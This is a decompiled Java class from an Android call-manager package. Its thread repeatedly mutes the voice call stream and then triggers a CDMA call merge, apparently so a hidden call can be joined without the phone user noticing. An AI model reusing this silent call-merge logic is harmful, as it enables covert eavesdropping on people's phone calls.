package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.SystemClock;
import com.vvt.callmanager.a.m;

class e
  extends Thread
{
  e(FilterCdmaCall.CallState.6 param6, int paramInt) {}
  
  public void run()
  {
    boolean bool = true;
    m localm = null;
    FilterCdmaCall localFilterCdmaCall = this.b.mFilterCall;
    Object localObject = "Mute ON";
    FilterCdmaCall.a(localFilterCdmaCall, (String)localObject);
    int i = 0;
    localFilterCdmaCall = null;
    for (;;)
    {
      int j = this.a;
      if (i >= j) {
        break;
      }
      long l = 1000L;
      SystemClock.sleep(l);
      FilterCdmaCall.c(this.b.mFilterCall).setMode(0);
      localObject = FilterCdmaCall.c(this.b.mFilterCall);
      ((AudioManager)localObject).setStreamMute(0, bool);
      i += 1;
    }
    localFilterCdmaCall = this.b.mFilterCall;
    localm = FilterCdmaCall.a(this.b.mFilterCall);
    i.a(localFilterCdmaCall, localm);
    this.b.waitForFlashMergeResponse = bool;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */